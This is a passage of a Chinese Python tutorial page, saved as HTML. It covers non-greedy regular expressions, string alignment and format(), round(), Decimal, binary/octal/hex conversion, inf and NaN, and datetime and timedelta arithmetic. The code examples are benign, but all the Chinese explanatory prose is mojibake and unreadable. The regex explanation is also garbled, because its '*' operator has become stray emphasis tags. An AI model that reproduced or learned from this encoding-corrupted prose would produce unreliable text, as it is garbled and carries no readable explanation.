"yes."'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>str_pat.findall(text2)</span><br><span class="line">[<span class="string">'no." phone says "yes.'</span>]</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæ¨¡å¼<code>r&#39;\&quot;(.*)\&quot;&#39;</code>çš„æ„å›¾æ˜¯åŒ¹é…è¢«åŒå¼•å·åŒ…å«çš„æ–‡æœ¬ã€‚ ä½†æ˜¯åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­<em>æ“ä½œç¬¦æ˜¯è´ªå©ªçš„ï¼Œå› æ­¤åŒ¹é…æ“ä½œä¼šæŸ¥æ‰¾æœ€é•¿çš„å¯èƒ½åŒ¹é…ã€‚ äºæ˜¯åœ¨ç¬¬äºŒä¸ªä¾‹å­ä¸­æœç´¢<code>text2</code>çš„æ—¶å€™è¿”å›ç»“æœå¹¶ä¸æ˜¯æ­£ç¡®çš„ã€‚<br>ä¸ºäº†ä¿®æ­£è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥åœ¨æ¨¡å¼ä¸­çš„</em>æ“ä½œç¬¦åé¢åŠ ä¸Š?ä¿®é¥°ç¬¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>str_pat = re.compile(<span class="string">r'"(.*?)"'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>str_pat.findall(text2)</span><br><span class="line">[<span class="string">'no.'</span>, <span class="string">'yes.'</span>]</span><br></pre></td></tr></table></figure><h4 id="å­—ç¬¦ä¸²å¯¹é½"><a href="#å­—ç¬¦ä¸²å¯¹é½" class="headerlink" title="å­—ç¬¦ä¸²å¯¹é½"></a>å­—ç¬¦ä¸²å¯¹é½</h4><p>å¯¹äºåŸºæœ¬çš„å­—ç¬¦ä¸²å¯¹é½æ“ä½œï¼Œå¯ä»¥ä½¿ç”¨å­—ç¬¦ä¸²çš„<code>ljust()</code>,<code>rjust()</code>å’Œ<code>center()</code>æ–¹æ³•ã€‚ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>text = <span class="string">'Hello World'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>text.ljust(<span class="number">20</span>)</span><br><span class="line"><span class="string">'Hello World         '</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>text.rjust(<span class="number">20</span>)</span><br><span class="line"><span class="string">'         Hello World'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>text.center(<span class="number">20</span>)</span><br><span class="line"><span class="string">'    Hello World     '</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>æ‰€æœ‰è¿™äº›æ–¹æ³•éƒ½èƒ½æ¥å—ä¸€ä¸ªå¯é€‰çš„å¡«å……å­—ç¬¦ã€‚ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>text.rjust(<span class="number">20</span>,<span class="string">'='</span>)</span><br><span class="line"><span class="string">'=========Hello World'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>text.center(<span class="number">20</span>,<span class="string">'*'</span>)</span><br><span class="line"><span class="string">'****Hello World*****'</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>å‡½æ•°<code>format()</code>åŒæ ·å¯ä»¥ç”¨æ¥å¾ˆå®¹æ˜“çš„å¯¹é½å­—ç¬¦ä¸²ã€‚ ä½ è¦åšçš„å°±æ˜¯ä½¿ç”¨<code>&lt;,&gt;</code>æˆ–è€…<code>^</code>å­—ç¬¦åé¢ç´§è·Ÿä¸€ä¸ªæŒ‡å®šçš„å®½åº¦ã€‚æ¯”å¦‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>format(text, <span class="string">'&gt;20'</span>)</span><br><span class="line"><span class="string">'         Hello World'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>format(text, <span class="string">'&lt;20'</span>)</span><br><span class="line"><span class="string">'Hello World         '</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>format(text, <span class="string">'^20'</span>)</span><br><span class="line"><span class="string">'    Hello World     '</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>å¦‚æœä½ æƒ³æŒ‡å®šä¸€ä¸ªéç©ºæ ¼çš„å¡«å……å­—ç¬¦ï¼Œå°†å®ƒå†™åˆ°å¯¹é½å­—ç¬¦çš„å‰é¢å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>format(text, <span class="string">'=&gt;20s'</span>)</span><br><span class="line"><span class="string">'=========Hello World'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>format(text, <span class="string">'*^20s'</span>)</span><br><span class="line"><span class="string">'****Hello World*****'</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="æ—¥æœŸå’Œæ—¶é—´"><a href="#æ—¥æœŸå’Œæ—¶é—´" class="headerlink" title="æ—¥æœŸå’Œæ—¶é—´"></a>æ—¥æœŸå’Œæ—¶é—´</h3><h4 id="æ•°å­—çš„å››èˆäº”å…¥"><a href="#æ•°å­—çš„å››èˆäº”å…¥" class="headerlink" title="æ•°å­—çš„å››èˆäº”å…¥"></a>æ•°å­—çš„å››èˆäº”å…¥</h4><p>å¯¹äºç®€å•çš„èˆå…¥è¿ç®—ï¼Œä½¿ç”¨å†…ç½®çš„<code>round(value, ndigits)</code>å‡½æ•°å³å¯ã€‚ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>round(<span class="number">1.23</span>, <span class="number">1</span>)</span><br><span class="line"><span class="number">1.2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>round(<span class="number">1.27</span>, <span class="number">1</span>)</span><br><span class="line"><span class="number">1.3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>round(<span class="number">-1.27</span>, <span class="number">1</span>)</span><br><span class="line"><span class="number">-1.3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>round(<span class="number">1.25361</span>,<span class="number">3</span>)</span><br><span class="line"><span class="number">1.254</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šå½“ä¸€ä¸ªå€¼åˆšå¥½åœ¨ä¸¤ä¸ªè¾¹ç•Œçš„ä¸­é—´çš„æ—¶å€™ï¼Œ<code>round</code>å‡½æ•°è¿”å›ç¦»å®ƒæœ€è¿‘çš„å¶æ•°ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œå¯¹1.5æˆ–è€…2.5çš„èˆå…¥è¿ç®—éƒ½ä¼šå¾—åˆ°2ã€‚</p><p>ä¼ ç»™ round() å‡½æ•°çš„ ndigits å‚æ•°å¯ä»¥æ˜¯è´Ÿæ•°ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œ èˆå…¥è¿ç®—ä¼šä½œç”¨åœ¨åä½ã€ç™¾ä½ã€åƒä½ç­‰ä¸Šé¢ã€‚ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">1627731</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>round(a, <span class="number">-1</span>)</span><br><span class="line"><span class="number">1627730</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>round(a, <span class="number">-2</span>)</span><br><span class="line"><span class="number">1627700</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>round(a, <span class="number">-3</span>)</span><br><span class="line"><span class="number">1628000</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>ä¸è¦å°†èˆå…¥å’Œæ ¼å¼åŒ–è¾“å‡ºææ··æ·†äº†ã€‚ å¦‚æœä½ çš„ç›®çš„åªæ˜¯ç®€å•çš„è¾“å‡ºä¸€å®šå®½åº¦çš„æ•°ï¼Œä½ ä¸éœ€è¦ä½¿ç”¨<code>round()</code>å‡½æ•°ã€‚ è€Œä»…ä»…åªéœ€è¦åœ¨æ ¼å¼åŒ–çš„æ—¶å€™æŒ‡å®šç²¾åº¦å³å¯ã€‚ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>x = <span class="number">1.23456</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>format(x, <span class="string">'0.2f'</span>)</span><br><span class="line"><span class="string">'1.23'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>format(x, <span class="string">'0.3f'</span>)</span><br><span class="line"><span class="string">'1.235'</span></span><br></pre></td></tr></table></figure><h4 id="æ‰§è¡Œç²¾ç¡®çš„æµ®ç‚¹æ•°è¿ç®—"><a href="#æ‰§è¡Œç²¾ç¡®çš„æµ®ç‚¹æ•°è¿ç®—" class="headerlink" title="æ‰§è¡Œç²¾ç¡®çš„æµ®ç‚¹æ•°è¿ç®—"></a>æ‰§è¡Œç²¾ç¡®çš„æµ®ç‚¹æ•°è¿ç®—</h4><p>æµ®ç‚¹æ•°çš„ä¸€ä¸ªæ™®éé—®é¢˜æ˜¯å®ƒä»¬å¹¶ä¸èƒ½ç²¾ç¡®çš„è¡¨ç¤ºåè¿›åˆ¶æ•°ã€‚ å¹¶ä¸”ï¼Œå³ä½¿æ˜¯æœ€ç®€å•çš„æ•°å­¦è¿ç®—ä¹Ÿä¼šäº§ç”Ÿå°çš„è¯¯å·®ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">4.2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = <span class="number">2.1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a + b</span><br><span class="line"><span class="number">6.300000000000001</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>(a + b) == <span class="number">6.3</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>è¿™äº›é”™è¯¯æ˜¯ç”±åº•å±‚CPUå’ŒIEEE 754æ ‡å‡†é€šè¿‡è‡ªå·±çš„æµ®ç‚¹å•ä½å»æ‰§è¡Œç®—æœ¯æ—¶çš„ç‰¹å¾ã€‚ ç”±äºPythonçš„æµ®ç‚¹æ•°æ®ç±»å‹ä½¿ç”¨åº•å±‚è¡¨ç¤ºå­˜å‚¨æ•°æ®ï¼Œå› æ­¤ä½ æ²¡åŠæ³•å»é¿å…è¿™æ ·çš„è¯¯å·®ã€‚å¦‚æœæƒ³æ›´åŠ ç²¾ç¡®å¯ä»¥ä½¿ç”¨<code>decimal</code>æ¨¡å—ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = Decimal(<span class="string">'4.2'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = Decimal(<span class="string">'2.1'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a + b</span><br><span class="line">Decimal(<span class="string">'6.3'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(a + b)</span><br><span class="line"><span class="number">6.3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>(a + b) == Decimal(<span class="string">'6.3'</span>)</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure><h4 id="è¾“å‡ºè¿›åˆ¶æ•´æ•°"><a href="#è¾“å‡ºè¿›åˆ¶æ•´æ•°" class="headerlink" title="è¾“å‡ºè¿›åˆ¶æ•´æ•°"></a>è¾“å‡ºè¿›åˆ¶æ•´æ•°</h4><p>ä¸ºäº†å°†æ•´æ•°è½¬æ¢ä¸ºäºŒè¿›åˆ¶ã€å…«è¿›åˆ¶æˆ–åå…­è¿›åˆ¶çš„æ–‡æœ¬ä¸²ï¼Œ å¯ä»¥åˆ†åˆ«ä½¿ç”¨<code>bin()</code>,<code>oct()</code>æˆ–<code>hex()</code>å‡½æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>x = <span class="number">1234</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bin(x)</span><br><span class="line"><span class="string">'0b10011010010'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>oct(x)</span><br><span class="line"><span class="string">'0o2322'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(x)</span><br><span class="line"><span class="string">'0x4d2'</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>å¦å¤–ï¼Œå¦‚æœä½ ä¸æƒ³è¾“å‡º0b,0oæˆ–è€…0xçš„å‰ç¼€çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨<code>format()</code>å‡½æ•°ã€‚ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>format(x, <span class="string">'b'</span>)</span><br><span class="line"><span class="string">'10011010010'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>format(x, <span class="string">'o'</span>)</span><br><span class="line"><span class="string">'2322'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>format(x, <span class="string">'x'</span>)</span><br><span class="line"><span class="string">'4d2'</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h4 id="æ— ç©·å¤§å’ŒNaN"><a href="#æ— ç©·å¤§å’ŒNaN" class="headerlink" title="æ— ç©·å¤§å’ŒNaN"></a>æ— ç©·å¤§å’ŒNaN</h4><p>Pythonå¹¶æ²¡æœ‰ç‰¹æ®Šçš„è¯­æ³•æ¥è¡¨ç¤ºè¿™äº›ç‰¹æ®Šçš„æµ®ç‚¹å€¼ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨<code>float()</code>æ¥åˆ›å»ºå®ƒä»¬ã€‚ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = float(<span class="string">'inf'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = float(<span class="string">'-inf'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = float(<span class="string">'nan'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">inf</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line">-inf</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c</span><br><span class="line">nan</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>ä¸ºäº†æµ‹è¯•è¿™äº›å€¼çš„å­˜åœ¨ï¼Œä½¿ç”¨<code>math.isinf()</code>å’Œ<code>math.isnan()</code>å‡½æ•°ã€‚ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>math.isinf(a)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>math.isnan(c)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h4 id="åŸºæœ¬çš„æ—¥æœŸä¸æ—¶é—´è½¬æ¢"><a href="#åŸºæœ¬çš„æ—¥æœŸä¸æ—¶é—´è½¬æ¢" class="headerlink" title="åŸºæœ¬çš„æ—¥æœŸä¸æ—¶é—´è½¬æ¢"></a>åŸºæœ¬çš„æ—¥æœŸä¸æ—¶é—´è½¬æ¢</h4><p>ä¸ºäº†æ‰§è¡Œä¸åŒæ—¶é—´å•ä½çš„è½¬æ¢å’Œè®¡ç®—ï¼Œå¯ä»¥ä½¿ç”¨<code>datetime</code>æ¨¡å—ï¼Œä¸ºäº†è¡¨ç¤ºä¸€ä¸ªæ—¶é—´æ®µï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ª<code>timedelta</code>å®ä¾‹ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> datetime <span class="keyword">import</span> timedelta</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = timedelta(days=<span class="number">2</span>, hours=<span class="number">6</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = timedelta(hours=<span class="number">4.5</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = a + b</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c.days</span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c.seconds</span><br><span class="line"><span class="number">37800</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c.seconds / <span class="number">3600</span></span><br><span class="line"><span class="number">10.5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c.total_seconds() / <span class="number">3600</span></span><br><span class="line"><span class="number">58.5</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>å¦‚æœæƒ³è¡¨ç¤ºæŒ‡å®šçš„æ—¥æœŸå’Œæ—¶é—´ï¼Œå…ˆåˆ›å»ºä¸€ä¸ª<code>datetime</code>å®ä¾‹ç„¶åä½¿ç”¨æ ‡å‡†çš„æ•°å­¦è¿ç®—æ¥æ“ä½œï¼Œå®ä¾‹å¦‚ä¸‹:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> datetime <span class="keyword">import</span> timedelta</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = datetime(<span class="number">2023</span>,<span class="number">10</span>,<span class="number">9</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(a+timedelta(days=<span class="number">10</span>))</span><br><span class="line"><span class="number">2023</span><span class="number">-10</span><span class="number">-19</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = datetime(<span class="number">2023</span>,<span class="number">11</span>,<span class="number">11</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = b - a</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.days</span><br><span class="line"><span class="number">33</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>now = datetime.today()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(now)</span><br><span class="line"><span class="number">2023</span><span class="number">-10</span><span class="number">-09</span> <span class="number">08</span>:<span class="number">58</span>:<span class="number">22.071529</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(now+timedelta(minutes=<span class="number">10</span>))</span><br><span class="line"><span class="number">2023</span><span class="number">-10</span><span class="number">-09</span> <span class="number">09</span>:<span class="number">08</span>:<span class="number">22.071529</span></span><br></pre></td></tr></table></figure><h4 id="è®¡ç®—å½“å‰æœˆä»½çš„æ—¥æœŸèŒƒå›´"><a href="#è®¡ç®—å½“å‰æœˆä»½çš„æ—¥æœŸèŒƒå›´" class="headerlink" title="è®¡ç®—å½“å‰æœˆä»½çš„æ—¥æœŸèŒƒå›´"></a>è®¡ç®—å½“å‰æœˆä»½çš„æ—¥æœŸèŒƒå›´</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime, date, timedelta</span><br><span class="line"><span class="keyword">import</span> calendar</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_month_range</span><span class="params">(start_date=None)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> start_date <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        start_date = date.today().replace(day=<span class="number">1</span>)</span><br><span class="line">    _, days_in_month = calendar.monthrange(start_date.year, start_date.month)</span><br><span class="line">    end_date = start_date + timedelta(days=days_in_month)</span><br><span class="line">    <span class="keyword">return</span> (start_date, end_date)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a_day = timedelta(days=<span class="number">1</span>)</span><br><span class="line">first_day, last_day = get_month_range()</span><br><span class="line"><span class="keyword">while</span> first_day &lt; last_day:</span><br><span class="line">    print(first_day)</span><br><span class="line">    first_day += a_day</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ä»£ç é¦–å…ˆè®¡ç®—å‡ºå½“æœˆçš„ç¬¬ä¸€å¤©çš„æ—¥æœŸï¼Œé€šè¿‡<code>date</code>å¯¹è±¡çš„<code>replace()</code>æ–¹æ³•å°†<code>days</code>å±æ€§è®¾ç½®ä¸º1å³å¯ã€‚ç„¶åï¼Œä½¿ç”¨<code>calendar.monthrange()</code>å‡½æ•°æ¥æ‰¾å‡ºè¯¥æœˆçš„æ€»å¤©æ•°ã€‚<code>monthrange()</code>å‡½æ•°ä¼šè¿”å›åŒ…å«æ˜ŸæœŸå’Œè¯¥æœˆå¤©æ•°çš„å…ƒç»„ã€‚ä¸€æ—¦è¯¥æœˆçš„å¤©æ•°å·²çŸ¥äº†ï¼Œé‚£ä¹ˆç»“æŸæ—¥æœŸå°±å¯ä»¥é€šè¿‡åœ¨å¼€å§‹æ—¥æœŸä¸Šé¢åŠ ä¸Šè¿™ä¸ªå¤©æ•°è·å¾—ã€‚ æœ‰ä¸ªéœ€è¦æ³¨æ„çš„æ˜¯ç»“æŸæ—¥æœŸå¹¶ä¸åŒ…å«åœ¨è¿™ä¸ªæ—¥æœŸèŒƒå›´å†…ã€‚ è¿™ä¸ªå’Œ<code>Python</code>çš„<code>slice</code>ä¸<code>range</code>æ“ä½œè¡Œä¸ºä¿æŒä¸€è‡´ï¼ŒåŒæ ·ä¹Ÿä¸åŒ…å«ç»“å°¾ã€‚ä¸ºäº†åœ¨æ—¥æœŸèŒƒå›´ä¸Šå¾ªç¯ï¼Œè¦ä½¿ç”¨åˆ°æ ‡å‡†çš„æ•°å­¦å’Œæ¯”è¾ƒæ“ä½œã€‚ æ¯”å¦‚ï¼Œå¯ä»¥åˆ©ç”¨<code>timedelta</code>å®ä¾‹æ¥é€’å¢æ—¥æœŸï¼Œå°äºå·<code>&lt;</code>ç”¨æ¥æ£€æŸ¥ä¸€ä¸ªæ—¥æœŸæ˜¯å¦åœ¨ç»“æŸæ—¥æœŸä¹‹å‰ã€‚</p><h4 id="å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ—¥æœŸ"><a href="#å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ—¥æœŸ" class="headerlink" title="å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ—¥æœŸ"></a>å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ—¥æœŸ</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>text = <span class="string">'2023-10-9'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>y = datetime.strptime(text,<span class="string">"%Y-%m-%d"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>y</span><br><span class="line">datetime.datetime(<span class="number">2023</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>z = datetime.now()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>z</span><br><span class="line">datetime.datetime(<span class="number">2023</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">57</span>, <span class="number">13</span>, <span class="number">378621</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>diff = z-y</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>diff</span><br><span class="line">datetime.timedelta(seconds=<span class="number">35833</span>, microseconds=<span class="number">378621</span>)</span><br></pre></td></tr></table></figure><p><code>datetime.strptime()</code>æ–¹æ³•æ”¯æŒå¾ˆå¤šçš„æ ¼å¼åŒ–ä»£ç ï¼Œ æ¯”å¦‚<code>%Y</code> ä»£è¡¨4ä½æ•°å¹´ä»½ï¼Œ<code>%m</code>ä»£è¡¨ä¸¤ä½æ•°æœˆä»½ã€‚ è¿˜æœ‰ä¸€ç‚¹å€¼å¾—æ³¨æ„çš„æ˜¯è¿™äº›æ ¼å¼åŒ–å ä½ç¬¦ä¹Ÿå¯ä»¥åè¿‡æ¥ä½¿ç”¨ï¼Œå°†æ—¥æœŸè¾“å‡ºä¸ºæŒ‡å®šçš„æ ¼å¼å­—ç¬¦ä¸²å½¢å¼ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">datetime.datetime(<span class="number">2023</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">9</span>, <span 